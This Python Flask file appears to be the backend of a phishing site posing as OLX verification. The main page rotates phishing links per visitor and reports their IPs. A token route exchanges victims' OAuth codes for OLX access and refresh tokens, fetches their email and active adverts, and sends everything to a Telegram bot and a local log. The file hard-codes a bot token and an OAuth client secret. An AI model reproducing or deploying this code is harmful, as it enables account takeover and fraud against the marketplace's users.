from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import datetime

app = Flask(__name__)

# ---- ПЕРЕМЕННЫЕ ----
TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")

# ---- Функция отправки сообщений в Telegram ----
def send_telegram_message(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={
                "chat_id": TG_CHAT_ID, 
                "text": msg, 
                "parse_mode": "HTML", 
                "disable_web_page_preview": True
            },
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

# ---- Логика работы с доменами ----
def get_next_domain_from_file():
    file_path = 'domens.txt'
    fallback_link = "https://www.olx.ua/"

    if not os.path.exists(file_path):
        send_telegram_message("⚠️ <b>КРИТИЧЕСКАЯ ОШИБКА:</b> Файл <code>domens.txt</code> не найден!")
        return fallback_link

    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    if not lines:
        send_telegram_message("🚫 <b>ВНИМАНИЕ:</b> Ссылки в <code>domens.txt</code> закончились!")
        return fallback_link

    selected_link = lines[0].strip()
    
    with open(file_path, 'w', encoding='utf-8') as f:
        f.writelines(lines[1:])
        
    return selected_link

# ---- Главная страница (С КУКАМИ ВМЕСТО SQLITE) ----
@app.route('/')
def index():
    user_ip = request.remote_addr
    
    # 1. Проверяем, есть ли уже ссылка в КУКАХ браузера
    personal_link = request.cookies.get('user_p_link')
    is_new_visit = False

    if not personal_link:
        # 2. Если куки нет — берем новую ссылку из файла
        personal_link = get_next_domain_from_file()
        is_new_visit = True
        
        if personal_link != "https://www.olx.ua/":
            send_telegram_message(f"🆕 <b>Выдана ссылка</b>\n👤 IP: <code>{user_ip}</code>\n🔗 Link: {personal_link}")

    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            # Рендерим HTML
            rendered_html = render_template_string(html_content, personal_link=personal_link)
            
            # 3. Создаем ответ и сохраняем куку в браузере на 30 дней
            response = make_response(rendered_html)
            if is_new_visit:
                expire_date = datetime.datetime.now() + datetime.timedelta(days=30)
                response.set_cookie('user_p_link', personal_link, expires=expire_date)
            
            return response
    except Exception as e:
        return f"Ошибка шаблона: {e}", 500

# ---- Получение токена OLX через OAuth ----
@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    if not code:
        return jsonify({"error": "No code"}), 400

    token_url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'  
    }
    headers = {'User-Agent': 'Mozilla/5.0','Version': '2.0','Accept': 'application/json'}

    try:
        response = requests.post(token_url, data=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')

            auth_headers = {"Authorization": f"Bearer {access}","Version": "2.0","Accept": "application/json","User-Agent": "Mozilla/5.0"}

            email = "Не удалось получить"
            try:
                user_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
                if user_req.status_code == 200:
                    email = user_req.json().get('data', {}).get('email', 'Email скрыт')
            except: pass

            ads_info = "Объявлений не найдено"
            try:
                ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"status": "active", "limit": 15}, timeout=7)
                if ads_req.status_code == 200:
                    ads_data = ads_req.json().get('data', [])
                    if ads_data:
                        links = [f"• {ad.get('title', 'Без названия')} ({ad.get('url', '#')})" for ad in ads_data]
                        ads_info = "\n".join(links)
            except: pass

            # ФОРМИРУЕМ СООБЩЕНИЕ ДЛЯ ТГ
            msg = (f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n"
                   f"👤 <b>IP:</b> <code>{request.remote_addr}</code>\n"
                   f"👤 <b>Email:</b> <code>{email}</code>\n\n"
                   f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
                   f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
                   f"📦 <b>Активные объявления:</b>\n{ads_info}")
            
            send_telegram_message(msg)
            
            # ЗАПИСЬ В ЛОКАЛЬНЫЙ ФАЙЛ (если сервер позволит)
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(f"\n{msg}\n" + "-"*30)

            return jsonify(res_json), 200
        else:
            return jsonify({"error": response.text}), response.status_code

    except Exception as e:
        send_telegram_message(f"💥 <b>Критическая ошибка:</b> {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
